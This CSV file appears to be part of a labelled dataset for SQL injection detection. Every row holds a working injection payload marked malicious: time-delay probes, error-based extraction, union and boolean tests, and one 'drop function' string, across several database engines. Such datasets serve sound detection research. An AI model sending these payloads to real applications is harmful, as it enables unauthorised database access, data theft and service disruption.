row_index,payload_norm,label,sqli_type_hint
4590,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( ( 'jirc' = 'jirc,1,
4591,"1'+ ( select 'ples' where 4244 = 4244 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) ) +'",1,
4592,"1%"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ""%"" = """,1,
4593,"1 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) -- yekf",1,
4594,if ( 8574 = 7534 ) select 8574 else drop function nxbe--,1,
4595,1' ) and 7533 = 7533,1,
4596,"1 ) union all select null,null,null,null--",1,
4597,1'|| ( select 'scct' where 2587 = 2587 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) ||',1,
4598,-6449' ) ) or 2590 = 2848,1,
4599,1' where 3362 = 3362,1,
4600,-1252' ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'pzxh' like 'pzxh,1,
4601,-8684' where 9820 = 9820 or 6844 = 5105,1,
4602,"1%' ) ) ) union all select null,null,null,null--",1,
4603,"1' ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( 'inrm' like 'inrm",1,
4604,"( select 2768 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 2768 = 2768,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a )",1,
4605,1 ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ),1,
4606,"1%' ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
4607,select sleep ( 5 ) ) +',1,
4608,"1%"" ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,
4609,( select ( case when ( 3950 = 2747 ) then 1 else 1/ ( select 0 ) end ) ),1,
4610,"1%' ) union all select null,null,null,null,null#",1,
4611,select ( case when ( 4755 = 4784 ) then 1 else 4755* ( select 4755 from master..sysdatabases ) end ) --,1,
4612,"1"" or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ""jtgs"" like ""jtgs",1,
4613,1' ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( 'nqol' = 'nqol,1,
4614,"1%' ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( '%' = '",1,
4615,1' where 6168 = 6168,1,
4616,"1'|| ( select 'zvpl' where 5877 = 5877 union all select null,null#",1,
4617,"1"" ) ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""nevr"" like ""nevr",1,
4618,"-6772"" ) ) or 9323 = 9323#",1,
4619,"1"" and ( 7597 = 8422 ) *8422 and ""gywp"" like ""gywp",1,
